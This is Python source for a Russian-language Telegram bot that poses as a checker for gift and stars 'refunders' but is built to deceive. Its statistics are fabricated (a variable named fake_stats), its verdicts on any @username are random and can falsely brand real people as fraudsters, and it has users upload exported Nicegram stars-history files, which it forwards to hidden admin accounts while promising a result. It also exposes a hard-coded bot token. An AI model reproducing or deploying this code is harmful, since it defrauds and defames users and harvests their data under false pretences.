import telebot
from telebot import types
import random
import time
from datetime import datetime, timedelta
import threading
from flask import Flask, request, abort
import os

# Конфигурация
TOKEN = "8586658443:AAFKiZwIV1YjNIOnUl3rI4b-T-MyLDw211I"
ADMIN_ID = 8118184388,8440663547,5046075976  # Ваш Telegram ID
WEBHOOK_URL = "https://chekerbot-hm70.onrender.com"  # Замените на ваш Render URL

bot = telebot.TeleBot(TOKEN)
app = Flask(__name__)

# Статистика
fake_stats = {
    "total_checked": 1881321,
    "checked_users": 1316900,
    "refunders_detected": 564371,
    "in_progress": 21996,
    "total_requests": 3173920,
    "bot_started": "5 January 2025"
}

# Обновление статистики каждые 5 минут
def update_fake_stats():
    while True:
        time.sleep(300)
        increment = random.randint(1000, 5000)
        fake_stats["total_checked"] += increment
        fake_stats["checked_users"] += random.randint(700, 3500)
        fake_stats["refunders_detected"] += random.randint(300, 1500)
        fake_stats["in_progress"] = random.randint(20000, 25000)
        fake_stats["total_requests"] += increment * 2
        print(f"[{datetime.now()}] Статистика обновлена")

# Запускаем обновление статистики в фоне
stats_thread = threading.Thread(target=update_fake_stats, daemon=True)
stats_thread.start()

# Главное меню с инлайн-кнопками (4 ряда, без эмодзи)
def get_main_menu():
    keyboard = types.InlineKeyboardMarkup(row_width=1)

    btn1 = types.InlineKeyboardButton("Инструкция", callback_data="menu_instruction")
    btn2 = types.InlineKeyboardButton("Скачать NiceGram", url="https://nicegram.app/")  # Прямая ссылка
    btn3 = types.InlineKeyboardButton("Проверка на рефаунд", callback_data="menu_check")
    btn4 = types.InlineKeyboardButton("💹Статистика базы", callback_data="menu_stats")

    keyboard.add(btn1, btn2, btn3, btn4)
    return keyboard

# Стартовое сообщение с картинкой и меню
@bot.message_handler(commands=['start'])
def send_welcome(message):
    image_url = "https://i.ibb.co/3mL5wZZb/photo-2026-01-28-10-33-33.jpg"
    
    caption = (
        "Привет! Я - Бот, который поможет тебе не попасться на мошенников. "
        "Я помогу отличить реальный подарок от чистого визуала, чистый подарок "
        "без рефаунда и подарок, за который уже вернули деньги.\n\n"
        "Выбери действие:"
    )
    
    # Отправляем картинку с меню
    bot.send_photo(
        message.chat.id,
        image_url,
        caption=caption,
        reply_markup=get_main_menu()
    )

# Обработчик инлайн-кнопок
@bot.callback_query_handler(func=lambda call: True)
def handle_callback(call):
    chat_id = call.message.chat.id
    message_id = call.message.message_id

    if call.data == "menu_instruction":
        show_instruction(call)
    elif call.data == "menu_check":
        # Прямо отправляем сообщение про файл (не обновляем меню)
        bot.send_message(
            chat_id,
            "📤Отправьте файл истории звёзд формата .txt или .zip для проверки:\n\n"
        )
    elif call.data == "menu_stats":
        show_statistics(call)
    elif call.data == "back_to_menu":
        # Возврат в меню (редактируем текущее сообщение)
        try:
            caption = (
                "Привет! Я - Бот, который поможет тебе не попасться на мошенников. "
                "Я помогу отличить реальный подарок от чистого визуала, чистый подарок "
                "без рефаунда и подарок, за который уже вернули деньги.\n\n"
                "Выбери действие:"
            )
            
            bot.edit_message_caption(
                chat_id=chat_id,
                message_id=message_id,
                caption=caption,
                reply_markup=get_main_menu()
            )
        except:
            pass

# Показать инструкцию (редактируем текущее сообщение)
def show_instruction(call):
    instructions = (
        "Инструкция:\n\n"
        "1. 📥Скачайте приложение Nicegram с официального сайта\n"
        "2. 📌Откройте NiceGram и войдите в свой аккаунт\n"
        "3. ⚙️Зайдите в настройки и выберите пункт «Nicegram»\n"
        "4. 📤Экспортируйте данные истории звёзд\n"
        "5. 👇В меню бота нажмите 'Проверка на рефраунд'\n"
        "6. 🗂Отправьте файл боту\n\n"
    )

    keyboard = types.InlineKeyboardMarkup()
    keyboard.add(types.InlineKeyboardButton("Назад", callback_data="back_to_menu"))

    try:
        bot.edit_message_caption(
            chat_id=call.message.chat.id,
            message_id=call.message.message_id,
            caption=instructions,
            reply_markup=keyboard
        )
    except Exception as e:
        print(f"Ошибка при редактировании: {e}")

# Показать статистику (редактируем текущее сообщение)
def show_statistics(call):
    moscow_time = (datetime.utcnow() + timedelta(hours=3)).strftime("%d %B %Y - %H:%M")

    stats_text = (
        f"💹ИТОГОВОЕ СОСТОЯНИЕ ПРОВЕРКИ\n"
        f"⏰Московское время: {moscow_time}\n\n"
        f"📈ОБЩИЙ ОБЪЕМ ПРОВЕРЕННЫХ: {fake_stats['total_checked']:,}\n\n"
        f"📋ДЕТАЛЬНАЯ СТАТИСТИКА:\n"
        f"- ✅ Проверенных пользователей: {fake_stats['checked_users']:,}\n"
        f"- ⚠️Выявлено рефундеров: {fake_stats['refunders_detected']:,}\n"
        f"- ⌛️В процессе проверки: {fake_stats['in_progress']:,}\n"
        f"- 👥Всего запросов: {fake_stats['total_requests']:,}\n"
        f"- 🚀Бот запущен: {fake_stats['bot_started']}\n\n"
        f"Для проверки пользователя введите текст формата:\n"
        f"@username"
    )

    keyboard = types.InlineKeyboardMarkup()
    keyboard.add(types.InlineKeyboardButton("Назад", callback_data="back_to_menu"))

    try:
        bot.edit_message_caption(
            chat_id=call.message.chat.id,
            message_id=call.message.message_id,
            caption=stats_text,
            reply_markup=keyboard
        )
    except Exception as e:
        print(f"Ошибка при редактировании: {e}")

# Обработка username
@bot.message_handler(func=lambda message: message.text and message.text.startswith('@'))
def check_username(message):
    username = message.text
    is_refunder = random.choice([True, False, False, False])  # 25% шанс быть рефандером
    has_history = random.choice([True, False])  # 50% шанс что есть история
    
    # Картинка для проверки (из вашей ссылки)
    check_image_url = "https://i.ibb.co/9m5KZQRB/photo-2026-01-28-11-15-22.jpg"
    
    if not has_history:
        # Негативный вариант: нет истории
        caption_text = (
            f"⚠️ Пользователь {username} не отправлял свою историю звезд для проверки\n\n"
            f"🟡 Статус: Не проверен на рефаунд\n"
            f"🤔 Рекомендация: Необходимо проверить перед сделкой\n\n"
            f"Этот пользователь ещё не предоставил данные для проверки"
        )
    elif is_refunder:
        # Негативный вариант: рефандер
        caption_text = (
            f"🚨 ВНИМАНИЕ: Пользователь {username} обнаружен в базе рефандеров!\n\n"
            f"🔴 Статус: Опасный пользователь\n"
            f"📉 Обнаружено возвратов: {random.randint(1, 10)}\n"
            f"💸 Ущерб: ${random.randint(50, 500)}\n\n"
            f"❌ Не рекомендуется проводить сделки с этим пользователем"
        )
    else:
        # Позитивный вариант: чистый пользователь
        caption_text = (
            f"✅ Пользователь {username} проверен\n\n"
            f"🟢 Статус: Чистый пользователь\n"
            f"📊 Проверено транзакций: {random.randint(10, 100)}\n"
            f"⭐️ Всего звёзд: {random.randint(100, 5000)}\n"
            f"🎁 Отправлено подарков: {random.randint(5, 50)}\n\n"
            f"👍 Можно проводить сделки"
        )
    
    # Отправляем картинку с текстом
    bot.send_photo(
        message.chat.id,
        check_image_url,
        caption=caption_text
    )

# Обработка файлов
@bot.message_handler(content_types=['document'])
def handle_document(message):
    file_name = message.document.file_name

    if file_name.endswith('.txt') or file_name.endswith('.zip'):
        # Отправляем файл администратору
        try:
            admin_msg = (
                f"Новый файл от пользователя:\n"
                f"ID: {message.chat.id}\n"
                f"Имя: {message.from_user.first_name}\n"
                f"Файл: {file_name}\n"
                f"Время: {datetime.now().strftime('%H:%M:%S')}"
            )

            bot.send_message(ADMIN_ID, admin_msg)
            bot.forward_message(ADMIN_ID, message.chat.id, message.message_id)

            print(f"Файл {file_name} отправлен админу")
        except Exception as e:
            print(f"Ошибка: {e}")

        # Сообщение пользователю
        bot.send_message(
            message.chat.id,
            "🗂Файл принят в обработку\n\n"
            "⌛️Ожидайте результат проверки.\n"
            "🕐Примерное время ожидания: 30 минут\n\n"
            " ✅После завершения проверки вы получите уведомление.\n\n"
        )
    else:
        bot.send_message(
            message.chat.id,
            "❌Неверный формат файла. Отправьте файл .txt или .zip"
        )

# Обработка текстовых сообщений (не username)
@bot.message_handler(func=lambda message: True)
def handle_text(message):
    if message.text not in ['/start']:
        bot.send_message(
            message.chat.id,
            "Используйте меню для навигации или отправьте @username для проверки пользователя.\n\n"
            "Для открытия меню нажмите /start"
        )

# Flask маршруты для вебхука
@app.route('/')
def index():
    return "Telegram Bot is running!"

@app.route('/webhook', methods=['POST'])
def webhook():
    if request.headers.get('content-type') == 'application/json':
        json_string = request.get_data().decode('utf-8')
        update = telebot.types.Update.de_json(json_string)
        bot.process_new_updates([update])
        return ''
    else:
        abort(403)

@app.route('/set_webhook', methods=['GET'])
def set_webhook():
    # Устанавливаем вебхук
    webhook_url = f"{WEBHOOK_URL}/webhook"
    s = bot.set_webhook(url=webhook_url)
    
    if s:
        return f"Webhook установлен на {webhook_url}"
    else:
        return "Ошибка установки вебхука"

@app.route('/remove_webhook', methods=['GET'])
def remove_webhook():
    # Удаляем вебхук
    s = bot.remove_webhook()
    if s:
        return "Webhook удален"
    else:
        return "Ошибка удаления вебхука"

# Запуск Flask приложения
if __name__ == "__main__":
    # Автоматически устанавливаем вебхук при запуске
    webhook_url = f"{WEBHOOK_URL}/webhook"
    bot.remove_webhook()  # Сначала удаляем старый вебхук
    time.sleep(1)
    bot.set_webhook(url=webhook_url)
    
    print("=" * 50)
    print("Бот запущен через вебхук")
    print(f"Webhook URL: {webhook_url}")
    print(f"Админ ID: {ADMIN_ID}")
    print("Статистика обновляется каждые 5 минут")
    print("=" * 50)
    
    # Запускаем Flask сервер
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)
